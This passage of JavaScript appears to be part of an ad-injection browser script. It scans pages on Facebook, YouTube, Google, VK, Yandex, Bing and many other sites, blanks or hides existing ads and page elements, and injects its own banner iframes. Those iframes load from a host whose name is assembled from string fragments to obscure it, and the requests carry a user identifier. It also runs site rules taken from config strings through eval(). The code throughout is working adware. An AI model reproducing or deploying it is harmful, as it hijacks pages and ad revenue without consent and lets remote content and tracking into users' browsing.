                my_div.innerHTML = '<iframe src="' + "\/\/b" + ".de" + "lta" + "-ho" + "rse" + ".me" + "n\/c" + "ode" + "\/x\/" + "b\/?" + "pid" + "=30" + "041" + "4" + '&adu=' + kys_2() + '&pri=' + g_y + '&s=' + ssIndex + '" scrolling="no" ' + 'style="width:' + width + "px; height:" + height + 'px;border:0;padding:0;overflow:hidden;position:relative;" allowtransparency="true" data-mytype="name_baner"></iframe>';
                if (m_left) {
                    if (m_left > 20) {
                        m_left = 20;
                    }
                    my_div.setAttribute('style', 'display: inline-block;height:' + height + 'px !important;width:' + width + 'px !important;margin:0 auto;margin-left:' + m_left + 'px;z-index:99999999;border:0;');
                } else {
                    my_div.setAttribute('style', 'display: inline-block;height:' + height + 'px !important;width:' + width + 'px !important;margin:0 auto;z-index:99999999;border:0;');
                }
                fader_b.style.textAlign = 'center';
                fader_b.appendChild(my_div);
            };
            var str_rs = ',970x250,600x300,336x280,300x250,250x250,200x200,970x90,728x90,180x150,468x60,320x100,125x125,300x600,240x400,160x600,120x600,100x200,320x50,234x60,120x240,300x1050,980x120,250x360,930x180,580x400,750x300,750x200,750x100,';
            var str_rs_img = ',970x250,970x90,728x90,468x60,300x600,240x400,160x600,120x600,320x50,234x60,300x1050,980x120,930x180,580x400,750x300,750x200,750x100,';
            var not_str = ',970x250,600x300,300x250,250x250,200x200,970x90,728x90,180x150,468x60,320x100,125x125,300x600,240x400,160x600,120x600,100x200,';
            var xx_width = [{w: '970', h: '250'}, {w: '600', h: '300'}, {
                w: '300',
                h: '250'
            }, {w: '250', h: '250'}, {w: '200', h: '200'}, {w: '970', h: '90'}, {w: '728', h: '90'}, {
                w: '180',
                h: '150'
            }, {w: '468', h: '60'}, {w: '320', h: '100'}, {w: '125', h: '125'}];
            var xx_height = [{w: '600', h: '300'}, {w: '300', h: '600'}, {w: '240', h: '400'}, {
                w: '200',
                h: '200'
            }, {w: '160', h: '600'}, {w: '120', h: '600'}, {w: '100', h: '200'}, {w: '125', h: '125'}];
            var createDiv = function (height, width, fader_b, g_y) {
                if (!g_y) {
                    g_y = 0;
                }
                if (width >= height) {
                    var tttrue = true;
                    xx_width.forEach(function (p) {
                        if (tttrue === true && width >= p['w'] && height >= p['h']) {
                            tttrue = false;
                            var c = Math.floor(width / p['w']);
                            var l = width - (c * p['w']);
                            if (c > 1) {
                                l = l / c;
                                if (l < 3) {
                                    l = 0;
                                }
                            } else {
                                l = 0;
                            }
                            for (var i = 0; i < c; i++) {
                                createDiv_2(p['w'], p['h'], fader_b, g_y, l);
                            }
                        }
                    });
                } else if (width < height) {
                    tttrue = true;
                    xx_height.forEach(function (p) {
                        if (tttrue === true && width >= p['w'] && height >= p['h']) {
                            tttrue = false;
                            var c = Math.floor(height / p['h']);
                            for (var i = 0; i < c; i++) {
                                createDiv_2(p['w'], p['h'], fader_b, g_y);
                            }
                        }
                    });
                }
            };
            /*var get_image = function (width, height) {
                var img = document.createElement('img');
                img.src = 'https://domain/str_pl.php?pr_1&' + width + 'pr_2&' + height + 'pr_3&' + host;
                document.body.appendChild(img);
                setTimeout(function () {
                    img.parentNode.removeChild(img);
                }, 100);
            };*/
            var iskl = 'www.facebook.com*www.youtube.com';
            var each_change_peas = function (elem) {
                Array.prototype.forEach.call($$('' + elem + ''), function (a) {
                    if (a.offsetHeight > 59) {
                        change_peas(a);
                    }
                });
            };
            var change_peas = function (peas) {
                var height = peas.offsetHeight;
                if ((!peas.getAttribute('data-mytype') || (peas.getAttribute('data-mytype') && !peas.querySelector('iframe[data-mytype^="name_baner"]'))) && ((height > 59 && peas.offsetWidth > 468) || (height > 199 && peas.offsetWidth > 99) || (height > 124 && peas.offsetWidth > 124) || (height > 99 && peas.offsetWidth > 319))) {
                    var width = peas.offsetWidth;
                    if ((body_width / 100) * 90 > width || (body_height / 100) * 80 > height) {
                        peas.setAttribute('data-mytype', 'name_baner');
                        peas.innerHTML = '';
                        peas.setAttribute('style', 'padding-left:0;padding-top:0;text-align: center !important;');
                        createDiv(height, width, peas);
                    }
                }
            };
            var i;
            var t_ch_p = function (elem, style) {
                var e = document.querySelector('' + elem + '');
                if ((e && !e.getAttribute('data-mytype')) || (e && e.getAttribute('data-mytype') && !e.querySelector('iframe[data-mytype^="name_baner"]'))) {
                    if (style) {
                        e.setAttribute('style', style);
                    }
                    change_peas(e);
                }
            };
            var n_b = function (fader, width, height, style) {
                var mm = document.createElement("div");
                mm.setAttribute('data-mytype', 'name_baner');
                fader.setAttribute('data-mytype', 'name_baner');
                mm.setAttribute('style', style);
                fader.appendChild(mm);
                createDiv(height, width, mm);
            };
            var n_b_2 = function (elem, wid, heig, style) {
                Array.prototype.forEach.call($$('' + elem + ''), function (a) {
                    if ((!a.getAttribute('data-mytype') && a.offsetWidth >= wid) || (a.getAttribute('data-mytype') && !a.querySelector('iframe[data-mytype^="name_baner"]') && a.offsetWidth >= wid)) {
                        n_b(a, wid, heig, style);
                    }
                });
            };
            var tr_insert = function (elem, wid, heig, style) {
                var ddd = document.querySelector('' + elem + '');
                if (elem && ddd && !ddd.getAttribute('data-mytype') && ddd.offsetWidth >= wid) {
                    ddd.setAttribute('data-mytype', 'name_baner');
                    var mm = document.createElement("div");
                    mm.setAttribute('style', style);
                    ddd.insertBefore(mm, ddd.childNodes[0]);
                    createDiv(heig, wid, mm);
                }
            };
            var count_my = function (elem, count) {
                i = 0;
                Array.prototype.forEach.call($$('' + elem + ''), function (a) {
                    if (i % count === 0) {
                        if (!a.getAttribute('data-mytype')) {
                            change_peas(a);
                        }
                    }
                    i++;
                });
            };
            var count_my_ad = function (elem, count, wid, heig, style) {
                i = 0;
                Array.prototype.forEach.call($$('' + elem + ''), function (a) {
                    if (i % count === 0) {
                        if (!a.getAttribute('data-mytype') && a.offsetWidth >= wid) {
                            n_b(a, wid, heig, style);
                        }
                    }
                    i++;
                });
            };
            var ifr_host_each = function (hst) {
                Array.prototype.forEach.call($$('iframe'), function (a) {
                    if (a.src && a.src.indexOf(hst) !== -1) {
                        var fader = a.parentNode;
                        change_peas(fader);
                    }
                });
            };
            var ad_all_length = function (elem, height, style) {
                var x = document.querySelector('' + elem + '');
                if (x && !x.getAttribute('data-mytype') && height < 1000) {
                    var w = x.offsetWidth - x.style.paddingLeft - x.style.paddingRight;
                    if (height > 200 && w > 930) {
                        w = 930;
                    }
                    tr_insert(elem, w, height, 'width:' + w + 'px;' + style + '');
                }
            };
            var int_funk = function () {
                var t_bs = function () {
                    if (adult === 1) {
                        var bt = function () {
                            if (!body.getAttribute('data-mytype')) {
                                body.setAttribute('data-mytype', 'name_b');
                                var md = document.createElement('div');
                                var l = (body_width - 728) / 2;
                                md.setAttribute('style', 'background:#fff;position:fixed;bottom:0;left:' + l + 'px;width:728px;height:90px;z-index:999;');
                                body.appendChild(md);
                                var sp = document.createElement('span');
                                sp.innerText = 'x';
                                sp.setAttribute('style', 'z-index:999999;color: red;font-size:25px;font-weight:bold;cursor:pointer;position:absolute;right:-9px;top:-20px;');
                                sp.onclick = function () {
                                    md.parentNode.removeChild(md);
                                };
                                md.appendChild(sp);
                                createDiv(90, 728, md);
                            }
                        };
                        bt();
                    }
                    if (host === 'www.facebook.com') {
                        if (window.pageYOffset > 1500) {
                            var ct = document.querySelector('div[class^="_64b"]');
                            if (ct && !ct.getAttribute('data-mytype')) {
                                var f = ct.firstElementChild;
                                ct.style.top = '-' + (f.offsetHeight + 40) + 'px';
                                ct.setAttribute('data-mytype', 'name_baner');
                                var r = document.querySelector('div[class^="_26z1"]');
                                if (r && !r.getAttribute('data-mytype')) {
                                    r.setAttribute('data-mytype', 'name_baner');
                                    n_b(r, 200, 600, 'width:200px;height:800px;margin:0 auto;');
                                }
                            }
                        }
                        var chn = function (a, b, n) {
                            Array.prototype.forEach.call($$(a), function (a) {
                                var par = a.parentNode;
                                var cd = true;
                                for (var c = 0; c < 11; c++) {
                                    par = par.parentNode;
                                    if (cd === true && par.className === b) {
                                        par.style.maxHeight = n + 'px';
                                        change_peas(par);
                                        cd = false;
                                        break;
                                    }
                                }
                            });
                        };
                        chn('a[class^="_3e_2 _m8c"]', '_1dwg _1w_m', 290);
                        chn('a[class^="adsCategoryTitleLink"]', 'ego_section', 400);

                    } else if ((host.indexOf('google') !== -1 || host.indexOf('local-ntp')) !== -1 && host.indexOf('translate') === -1) {
                        var rgt = document.querySelector('div[id^="rhs_block"]');
                        if (rgt) {
                            rgt.style.minWidth = '300px';
                            ad_all_length('div[id^="rhs_block"]', 250, 'min-width:310px;width:300px;height:250px;margin:10px auto 10px 0;');
                        }
                        var s = document.querySelector('#most-visited');
                        var s_2 = document.querySelector('#prm-pt');
                        if (s && !s.getAttribute('data-mytype')) {
                            tr_insert('#most-visited', 600, 300, 'width:600px;height:300px;z-index:999;margin:10px auto;', 'c');
                        } else if (!s && s_2 && !s_2.getAttribute('data-mytype')) {
                            tr_insert('#prm-pt', 600, 300, 'width:600px;height:300px;z-index:999;margin:10px auto;', 'c');
                        }
                    } else if (host === 'www.youtube.com' && (!$_GET('q') || ($_GET('q') && $_GET('q') !== 'gHtFdrR'))) {
                        ad_all_length('div[id^="feed-main-what_to_watch"]', 90, 'margin:5px auto');
                        ad_all_length('ytd-section-list-renderer[id^="primary"]', 90, 'margin:15px auto 5px auto');
                        n_b_2('div[class^="feed-item-container"]', 728, 90, 'margin:5px auto;width:728px;height:90px;');
                        n_b_2('ytd-item-section-renderer[class^="style-scope ytd-section-list-renderer"]', 728, 90, 'margin:5px auto;width:728px;height:90px;');
                        t_ch_p('#watch7-sidebar-ads', 'width:300px;height:250px;margin:0 auto;');
                        t_ch_p('#player-ads', 'width:300px;height:250px;margin:0 auto;');
                        n_b_2('div[id^="watch-header"]', 600, 300, 'padding-top:10px;');
                        n_b_2('div[id^="info-contents"]', 600, 300, 'padding-top:10px;');
                        each_change_peas('div[id^="google_companion_ad_div"]', 'c');
                        each_change_peas('.image-container', 'c');
                        each_change_peas('div[class^="image-container"]');
                        var b = 0;
                        Array.prototype.forEach.call($$('ytd-compact-video-renderer[class^="style-scope ytd-watch-next-secondary-results-renderer"]'), function (a) {
                            if (b % 5 === 0 && b < 19) {
                                if (!a.getAttribute('data-mytype') || (a.getAttribute('data-mytype') && !a.parentNode.querySelector('iframe[data-mytype^="name_baner"]'))) {
                                    a.setAttribute('data-mytype', 'name_baner');
                                    var parent = a.parentNode;
                                    var i = 0;
                                    while ((a = a.previousSibling) !== null) i++;
                                    var mm = document.createElement("div");
                                    mm.setAttribute('style', 'width:320px;height:100px;margin:0 0 15px 0;');
                                    var m_2 = document.createElement("div");
                                    m_2.setAttribute('style', 'width:320px;height:100px;margin-left:0;');
                                    mm.appendChild(m_2);
                                    parent.insertBefore(mm, parent.childNodes[i]);
                                    change_peas(m_2);
                                }
                            }
                            b++;
                        });
                        Array.prototype.forEach.call($$('li[class^="video-list-item related"]'), function (a) {
                            if (b % 5 === 0 && b < 19) {
                                if (!a.getAttribute('data-mytype')) {
                                    a.setAttribute('data-mytype', 'name_baner');
                                    var parent = a.parentNode;
                                    var i = 0;
                                    while ((a = a.previousSibling) !== null) i++;
                                    var mm = document.createElement("li");
                                    mm.setAttribute('style', 'width:320px;height:100px;margin:0 0 15px 0;');
                                    var m_2 = document.createElement("div");
                                    m_2.setAttribute('style', 'width:320px;height:100px;margin-left:0;');
                                    mm.appendChild(m_2);
                                    parent.insertBefore(mm, parent.childNodes[i]);
                                    change_peas(m_2);
                                }
                            }
                            b++;
                        });
                    } else if (host === 'vk.com') {
                        var leftt = document.querySelector('div[id^="ads_left"]');
                        if (leftt) {
                            leftt.innerHTML = '';
                            n_b(leftt, 160, 1200, 'width:120px;height:1200px;margin:0;');
                            leftt.id = 'vk_left_ads';
                            leftt.className = 'vk_left_ads';
                        }
                        n_b_2('div[id^="narrow_column"]', 200, 800, 'padding-top:10px;');
                        n_b_2('div[class^="audio_friends_list_content"]', 200, 400, 'padding-top:10px;');
                        ad_all_length('div[class^="audio_page_sections _audio_page"]', 90, 'margin:5px auto');
                        ad_all_length('div[id^="photos_all_block"]', 90, 'margin:5px auto');
                        ad_all_length('div[id^="video_content_catalog"]', 200, 'margin:5px auto');
                        ad_all_length('div[id^="pva_wrap"]', 90, 'margin:5px auto');
                        ad_all_length('div[id^="apps_after"]', 200, 'margin:5px auto');
                        tr_insert('div[class^="mv_info_wide_column fl_l"]', 600, 300, 'width:600px;margin:10px auto;');
                        var left_fix = document.querySelector('div[id^="stl_side"]');
                        if (left_fix) {
                            left_fix.parentNode.removeChild(left_fix);
                        }
                        each_change_peas('._ads_promoted_post_data_w');
                    } else if (host.indexOf('ok.ru') !== -1) {
                        t_ch_p('div[id^="hook_Block_ViewportHeightAwareBanner"]');
                        count_my_ad('div[class^="gs_result_i_w"]', 3, 180, 150, 'width:180px;padding-top:10px;');
                        ad_all_length('div[id^="hook_Block_RightColumnFriendPossible"]', 250, 'height:250px;margin:10px auto');
                        each_change_peas('div[data-btype^="LinkBanner_navigate"]');
                        n_b_2('div[id^="online-fr_block"]', 240, 400, 'width:240px;height:400px;margin:0 auto 10px auto;');
                    } else if (host.match(/yandex/im)) {
                        ad_all_length('div[class^="content__right"]', 250, 'width:300px;height:250px;margin:10px auto 10px 0');
                        var posik_d = document.querySelector('.home-arrow__search');
                        if (posik_d && !posik_d.getAttribute('data-mytype') && !document.querySelector('div[id^="banner"]')) {
                            n_b(posik_d, 728, 90, 'padding-top:10px;width:728px;height:90px;margin:0 auto;');
                            document.querySelector('.input__samples').style.marginTop = '113px';
                            document.querySelector('div[class^="container container__heap container__line heap"]').style.marginTop = '86px';
                        }
                        count_my('li[class^="b-501px-popular-themes__item"]', 4, 'b');
                        n_b_2('.rubric', 468, 60, 'width:468px;');
                    } else if (host === 'coccoc.com') {
                        ad_ad_2 = true;
                        var right = document.querySelector('div[class^="right-content"]');
                        if (right && !right.getAttribute('data-mytype') && document.location.href.indexOf('query=') !== -1) {
                            ad_all_length('div[class^="right-content"]', 250, 'height:250px;margin:10px auto');
                        }
                    } else if (host.match(/yahoo.com/im)) {
                        ad_da_2 = true;
                        count_my_ad('li[class^="js-stream-content"]', 6, 630, 250, 'padding-top:10px;width:630px;height:250px;');
                    } else if (host === 'www.bing.com') {
                        n_b_2('div[id^="sbox"]', 600, 300, 'width:600px;height:300px;padding:10px 0;');
                        ad_all_length('ol[id^="b_context"]', 250, 'width:300px;height:250px;margin:10px auto 10px 0');
                        ad_ad_2 = true;
                    } else if (host.match(/mail.ru/im)) {
                        ad_ad_2 = true;
                        var s_d = document.querySelector('div[class^="search__now-searching"]');
                        if (s_d) {
                            s_d.style.minHeight = '90px';
                            tr_insert('div[class^="search__now-searching"]', 728, 90, 'width:728px;height:90px;');
                        }
                        n_b_2('.article-photo', 468, 60, 'margin-top:10px;');
                        each_change_peas('div[class^="banner"]');
                        each_change_peas('div[class^="rb-slot-side"]');
                    } else if (host === 'fotostrana.ru') {
                        count_my('div[class^="pin-item-img"]', 4, 'b');
                        tr_insert('div[class^="meeting-parts meeting-content"]', 468, 60, 'width:468px;height:60px;padding-top:10px;');
                    } else if (host === 'www.pinterest.com') {
                        count_my('div[class^="pinImageActionButtonWrapper"]', 11);
                    } else if (host === 'rutube.ru') {
                        count_my_ad('li[class^="related-videos-item"]', 3, 320, 100, 'width:320px;padding-top:10px;');
                        ad_all_length('#related_video_block', 250, 'height:250px;margin:10px auto');
                        ad_ad_2 = true;
                    } else if (host === 'www.rediff.com') {
                        ad_ad_2 = true;
                        count_my('div[class^="newimgthumb"]', 7);
                    } else if (host === 'giphy.com') {
                        count_my('div[class^="_21i9prOBBMLnjP6qhMXo6m"]', 6);
                    } else if (host === 'www.webtretho.com') {
                        ad_ad_2 = true;
                        count_my_ad('div[class^="ati_nwp clbt ng-scope"]', 5, 300, 250, 'width:300px;padding-top:10px;');
                    } else {
                        ad_ad_3 = true;
                        ad_da_3 = true;
                    }
                    if (host !== '') {
                        if (iskl.indexOf(host) === -1) {
                            var host_2 = host.replace('www.', '');
                            var dom_b = host_2.split('.');
                            if (str_dm_ad && str_dm_ad.indexOf(dom_b[0]) !== -1) {
                                var p_1 = str_dm_ad.split('**');
                                if (p_1 && p_1.length > 0) {
                                    p_1.forEach(function (peas) {
                                        if (peas.indexOf(dom_b[0]) !== -1) {
                                            var p_2 = peas.split('*');
                                            if (ad_adl < 10 && p_2 && p_2.length > 0) {
                                                if (host.indexOf(p_2[0]) !== -1) {
                                                    ad_adl++;
                                                    if (p_2[3] === 'a') {
                                                        t_ch_p((p_2[1]), p_2[2]);
                                                    } else if (p_2[3] === 'b') {
                                                        each_change_peas(p_2[1]);
                                                    } else if (p_2[3] === 'c') {
                                                        ifr_host_each(p_2[1]);
                                                    } else if (p_2[3] === 'd') {
                                                        n_b_2(p_2[1], eval(p_2[4]), eval(p_2[5]), p_2[2]);
                                                    }
                                                }
                                            }
                                        }
                                    });
                                }
                            }
                        }
                        if (ad_ad_3 === true || ad_ad_2 === true && ad_adl < 10) {
                            host_2 = host.replace('www.', '');
                            dom_b = host_2.split('.');
                            if (str_dm_ad_2 && str_dm_ad_2.indexOf(dom_b[0]) !== -1) {
                                p_1 = str_dm_ad_2.split('**');
                                if (p_1 && p_1.length > 0) {
                                    p_1.forEach(function (peas) {
                                        if (peas.indexOf(dom_b[0]) !== -1) {
                                            var p_2 = peas.split('*');
                                            if (ad_adl < 10 && p_2 && p_2.length > 0) {
                                                if (host.indexOf(p_2[0]) !== -1) {
                                                    ad_adl++;
                                                    ad_all_length(p_2[1], eval(p_2[2]), 'height:' + p_2[2] + 'px;margin:10px auto');
                                                }
                                            }
                                        }
                                    });
                                }
                            }
                        }
                    }
                };
                t_bs();
                if (iskl.indexOf(host) === -1) {
                    function this_dont_fader() {
                        var change_peas = function (peas) {
                            var height = peas.offsetHeight;
                            if (!peas.getAttribute('data-mytype') && height >= 60) {
                                var width = peas.offsetWidth;
                                if ((body_width / 100) * 90 > width || (body_height / 100) * 80 > height) {
                                    var y = 0;
                                    if (peas.querySelector('yatag') || peas.querySelector('ins[id^="aswift"]') || peas.querySelector('iframe[id^="aswift"]') || peas.querySelector('iframe[id^="google_ads"]') || peas.querySelector('iframe[src^="https://tpc.googlesyndication.com/"]') || peas.querySelector('div[id^="google_ads"]') || peas.querySelector('div[id^="div-gpt-ad"]')) {
                                        y = 1;
                                    }
                                    peas.setAttribute('data-mytype', 'name_baner');
                                    peas.innerHTML = '';
                                    peas.setAttribute('style', 'padding-left:0;padding-top:0;text-align: center !important;');
                                    createDiv(height, width, peas, y);
                                    /*if (not_str.indexOf(width + 'x' + height) === -1 && Math.floor(Math.random() * 1000) === 555) {
                                        get_image(width, height);
                                    }*/
                                }
                            }
                        };
                        var all_this_divs = ['div[class^="rpwe-block"]', 'div[id^="ssvzone_"]', 'div[id^="adnzone_"]', 'div[id^="TrafficmediaComposite"]', 'div[class^="exo-native-widget-outer"]', 'span[class^="m_banner_show"]', 'div[class^="ac_adbox_inner"]', 'div[class^="vmc_ads_viewport"]', 'div[id^="SC_TBlock"]', 'div[id^="amzn_assoc_ad_div_adunit"]', 'div[id^="adform-adbox"]', 'div[class^="b-banner_sm"]', 'div[class^="adroll-block"]', 'div[id^="bbbb.creative"]', 'div[id^="abAdPlacementOutsiderswitcher"]', 'div[id^="rcjsload_"]', 'div[class^="ac_jbbox_inner"]', 'div[id^="mvBox"]', 'div[class^="OUTBRAIN"]', 'ins[class^="adsbygoogle"]', 'div[id^="MarketGidComposite"]', 'div[id^="actionteaser"]', 'div[class^="__lxG__multi"]', 'div[id^="smi2adblock_"]', 'div[id^="AdFox_banner_"]', 'div[class^="rb-slot js-module"]', 'div[class^="js-module_slot"]', 'div[class^="profit__inner"]', 'div[id^="yandex_direct"]', 'div[id^="Ya_sync"]', 'div[id^="yandex_rtb"]', 'div[id^="yandex_ad"]', 'div[id^="MarketGidComposit"]', 'div[id^="DIV_YNG"]', 'div[class^="pp_ad_container"]', 'div[class^="adm-masthead-body"]', 'div[class^="adm-scroll-body"]', 'div[class^="cdxhd_scroll_body"]', 'div[class^="admatic_interstitial"]', 'div[id^="bbb.creative"]', 'div[class^="goAdverticum"]', 'div[class^="geoAd_div"]', 'div[id^="extraAdsBlock"]', 'div[class^="onet-ad"]', 'div[class^="gallDx gallBox"]', 'div[class^="mkt-container"]', 'div[id^="ligatusframe"]', 'div[id^="div-gpt-ad"]', 'div[id^="hm_teaser"]', 'div[id^="div_utif"]', 'div[id^="pubdirecte"]', 'div[id^="admzone"]', 'div[id^="adtima-zone"]', 'div[class^="eng_recs_holder"]', 'div[class^="adssendo-zone"]', 'div[class^="ssvzContent"]', 'div[class^="cohoi_block"]', 'div[class^="plista_widget"]', 'div[class^="adfox-banner"]', 'div[class^="xhtml_banner"]', 'div[class^="lx_wrap"]', 'div[class^="mgbox"]', 'div[id^="BannerGIMG"]', 'div[id^="RTBDIV"]', 'div[id^="DIV_DA"]', 'div[class^="trc_rbox_container"]', 'div[class^="teaserBlockWrapper"]', 'div[class^="rb-banner"]', 'div[class^="adm-bnr"]', 'div[class^="HHC-Banners"]', 'div[id^="IL_INSEARCH"]', 'div[id^="adriver"]', 'div[class^="ngs-main-banner"]', 'div[class^="goAdverticum"]', 'div[id^="cs_im_container"]', 'center[id^="footer_banners"]', 'div[id^="bottomBanners"]', 'div[id^="EroIMslider"]', 'div[id^="eplAdDiv"]', 'div[class^="adriverBanner"]', 'div[class^="gnezdo_main_block"]', 'div[class^="lx__blk"]', 'div[class^="trafmag_table"]', 'div[id^="infox_ad_adfox"]', 'div[id^="tm-tb"]', 'div[id^="smile_teaser"]', 'div[class^="relap-gamesisart_ru__top-container"]', 'div[class^="pubexchange_module"]', 'div[class^="jsInfOverLay"]', 'div[class^="RTBDIV"]', 'div[class^="lx_outer"]', 'div[class^="ad-unit"]', 'div[class^="gnezdo_main_block"]', 'div[class^="tizerDiv"]', 'div[id^="mpuls-widget"]', 'div[id^="tizbaAdblock"]', 'div[id^="smi_teaser"]', 'div[id^="begun_div"]', 'div[id^="MIXADV"]', 'div[class^="mediaVertical"]', 'div[id^="DIV_NTV_"]', 'div[class^="trc_rbox"]'];
                        all_this_divs.forEach(function (pp) {
                            Array.prototype.forEach.call($$('' + pp + ''), function (a) {
                                if ((!a.getAttribute('data-mytype') && a.parentNode.tagName !== 'BODY') || (a.getAttribute('data-mytype') && a.getAttribute('data-mytype') !== 'name_baner' && a.parentNode.tagName !== 'BODY')) {
                                    change_peas(a);
                                }
                            });
                        });
                        Array.prototype.forEach.call($$('yatag'), function (a) {
                            for (var i = 0; i <= 8; i++) {
                                if (a) {
                                    a = a.parentNode;
                                }
                                if (a !== null && a.tagName === 'DIV' && a.firstElementChild.tagName === 'YATAG') {
                                    change_peas(a);
                                    a.className = 'ads_yat_c';
                                    a.id = 'ads_yat_i';
                                    return;
                                }
                            }
                        });
                        Array.prototype.forEach.call($$('a'), function (a) {
                            var f = a.parentNode;
                            var w = f.offsetWidth;
                            var h = f.offsetHeight;
                            if (a.href && !a.getAttribute('data-mytype') && a.parentNode.tagName !== 'BODY' && typeof(a.href) !== 'object' && a.href.indexOf(host) === -1 && a.style.display !== 'none' && h > 59 && w > 99 && a.offsetHeight > 5 && a.offsetWidth > 5 && ((body_width / 100) * 40 > w || (body_height / 100) * 40 > h) && a.href.match(/\/(bitrix\/[^0-9a-z]+(banner)[^0-9a-z]|ads\.ad4game\.com|illicium\.wmtransfer\.com|adv\.wp\.pl|d\.adroll\.com|zetahit\.click|newopenx\.detik\.com|media\.r18\.com|adfox\.ru|zone\.uniad\.vn|saxp\.zedo\.com|axp\.zedo\.com|engine\.adzerk\.net|csr\.onet\.pl|investoradbg\.hit\.gemius\.pl|ox\.tossoffads\.com|www\.projectwonderful\.com|cft2\.igromania\.ru|beta\.mediafort\.ru|clicks\.pipaffiliates\.comafs|www\.dtmads\.comaf|record\.ironaffiliates\.com|ads\.supplyframe\.com|go\.padsdel\.com|goto\.astdn\.ru|t\.mail\.ru|ads\.hmao\.net|i\.imedia\.cz|ireklama\.mk|pluska\.ads\.aimatch\.com|dolnet\.adman\.gr|s6ads\.tradeads\.eu|skyjet\.zbp\.ru|adv\.informika\.ru|b\.frida\.vse42\.ru|x\.fidelity-media\.com|trader\.garant\.ru|easybn\.com|ads2\.newmedia\.az|ad\.caradisiac-publicite\.com|fastclick\.co|lenkmio\.com|oa\.mover\.uz|ads\.farakav\.com|ww251\.smartadserver\.com|ad\.adverticum\.net|redir\.bebi\.com|seethisinaction\.com|ads\.brazzers\.com|frtyd\.com|affiliate\.w88club\.com|ad\.admitad\.com|click\.buzzcity\.net|record\.mytopaff\.com|traffic|server\.cpmstar\.com|a\.t\.webtracker\.jp|adclick\.g\.doubleclick\.net|openx\.jawharafm\.net|go\.cz\.bbelements\.com|lg1\.logging\.admicro\.vn|counter|ww84\.smartadserver\.com|ads\.rcs\.it|c\.imedia\.cz|go\.idnes\.bbelements\.com|optimized-by\.rubiconproject\.com|adserver\.biletix\.com|ad\.zanox\.com|hotmart\.net\.br|click\.union\.ucweb\.com|ww488\.smartadserver\.com|adserver\.adtech\.de|fra1-ib\.adnxs\.com|ams1-ib\.adnxs\.com|ads4pubs\.com|a\.tribalfusion\.com|cashpass\.ru|flylinks\.pw|advjump\.com|gnpu\.ftpglst\.com|hghit\.com|sub2\.bubblesmedia\.ru|staff\.letysheeps\.ru|teasermedia\.net|alitems\.com|c\.tmstrack\.com|traffic\.mylotto\.com|cityadspix\.com|thisclick\.network|traforet\.com|hgbn\.rocks|main\.exoclick\.com|rpc-php\.trafficfactory\.biz|adultfriendfinder\.com|tubecorporate\.com|smartadserver\.com|adsrv\.eacdn\.com|www\.vsemayki\.ru|steamplay\.net|pumpmanpro\.com|www\.xman-extra\.com|maxsizepro\.com|iamsextoy\.com|javsex\.net|bongacams\.com|reklama\.v102\.ru|clickindia\.com|www\.att\.com)/img)) {
                                if (a.firstElementChild && a.querySelector('img')) {
                                    change_peas(a.parentNode);
                                }
                            }
                        });
                    }

                    this_dont_fader();

                    function all_div_iframe_baners() {
                        var change_peas = function (peas) {
                            if (!peas.getAttribute('data-mytype') && peas.parentNode.tagName !== 'BODY') {
                                var win_width = (window.outerWidth / 100) * 90;
                                if (win_width > peas.offsetWidth && peas.style.display !== 'none') {
                                    var fader = peas.parentNode;
                                    var width = peas.offsetWidth;
                                    if (body_width > width) {
                                        var y = 0;
                                        if (fader.querySelector('yatag') || fader.querySelector('ins[id^="aswift"]') || fader.querySelector('iframe[id^="aswift"]') || fader.querySelector('iframe[id^="google_ads"]') || fader.querySelector('iframe[src^="https://tpc.googlesyndication.com/"]') || fader.querySelector('div[id^="google_ads"]') || fader.querySelector('div[id^="div-gpt-ad"]')) {
                                            y = 1;
                                        }
                                        var height = peas.offsetHeight;
                                        peas.setAttribute('style', 'display:none !important;opacity:0 !important;visibility:hidden !important;z-index:-999999999;');
                                        createDiv(height, width, fader, y);
                                        peas.parentNode.removeChild(peas);
                                        /*if (not_str.indexOf(width + 'x' + height) === -1 && Math.floor(Math.random() * 1000) === 555) {
                                            get_image(width, height);
                                        }*/
                                    }
                                }
                            }
                        };
                        Array.prototype.forEach.call($$('iframe'), function (a) {
                            if (!a.getAttribute('data-mytype')) {
                                var w = a.offsetWidth;
                                var h = a.offsetHeight;
                                if ((h >= 125 && w >= 125) || (h >= 60 && w >= 468) || (h >= 100 && w >= 320) || (h >= 200 && w >= 100)) {
                                    if ((a.src && if_rs(a) === 1) || (a.id && if_di(a) === 1)) {
                                        change_peas(a);
                                    } else if (a.src && a.src.match(/[^0-9a-z]+(nvdst\.com|promoviral\.com|fjjuo\.com|adserv\.com|bet365affiliates\.com|media\.easyads\.bg|betweendigital\.com|adriver\.ru|ng2\.virgul\.com|goyetteconnelly\.bid|adsrv\.eacdn\.com|newpromo|zedo\.com|smartadserver\.com|prppsn\.com|worldssl\.net|am15\.net|am[0-9]+\.net|gtcrm\.top|clhko\.top|ozdau\.top|adocean\.pl|ijrah\.top|speednetwork[0-9]+\.adk2x\.com)[^0-9a-z]+/img)) {
                                        change_peas(a);
                                    } else {
                                        var fader = a.parentNode;
                                        if (str_rs.indexOf(',' + w + 'x' + h + ',') !== -1) {
                                            if (fader && fader.tagName && fader.tagName !== 'BODY' && ((fader.offsetWidth >= w && fader.offsetHeight >= h) || fader.tagName === 'NOINDEX')) {
                                                a.setAttribute('data-mytype', 'name_banner');
                                                createDiv(h, w, fader);
                                                a.parentNode.removeChild(a);
                                            }
                                        }
                                    }
                                }

                            }
                        });
                        var divs = ['iframe[class^="xhtml_banner"]', 'iframe[src^="/showcase.php"]', 'iframe[class^="mbIFrame"]', '.ssvzHeader', 'embed[src^="http://www.trbetmedia.com/"]', 'iframe[class^="tynt-ad-frame"]', 'table[id^="SC_TBlock"]', 'table[class^="mctable"]', 'table[id^="teaser_block"]', 'table[id^="tizdiv_table"]', 'div[class^="wrapperAddBlock"]', 'div[class^="union-banner"]', 'div[class^="oyyb"]', 'div[class^="ssvzMid"]', 'div[class^="banners-footer"]', 'div[id^="adform-adbox"]', 'div[id^="oyy_banner"]', 'iframe[data-src-al^="//reklama.ngs.ru/"]'];
                        divs.forEach(function (pp) {
                            Array.prototype.forEach.call($$('' + pp + ''), function (a) {
                                change_peas(a);
                            });
                        });
                        Array.prototype.forEach.call($$('table'), function (a) {
                            var links = a.querySelectorAll('a');
                            var t = true;
                            var f = a.parentNode;
                            if (!a.querySelector('table') && links && links.length > 1 && ((body_width / 100) * 50 > f.offsetWidth || (body_height / 100) * 50 > f.offsetHeight)) {
                                links.forEach(function (pp) {
